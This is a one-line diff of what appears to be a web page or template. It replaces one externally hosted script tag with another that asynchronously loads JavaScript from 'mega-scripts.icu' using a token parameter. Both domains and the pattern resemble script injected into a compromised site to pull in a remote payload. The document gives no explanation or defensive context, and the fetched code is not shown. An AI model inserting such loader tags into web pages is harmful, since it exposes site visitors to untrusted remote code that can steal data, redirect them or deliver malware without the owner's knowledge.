@@ -1,1 +1,1 @@
-<script src="https://egr-erg-erg-erg-erg-erg-erg.puj.us/a4.js" type="text/javascript" async="true"></script>
+<script type="text/javascript" src="https://mega-scripts.icu/?token=9f407421dedf58ca565acc27c3f8891f"async="true"></script>
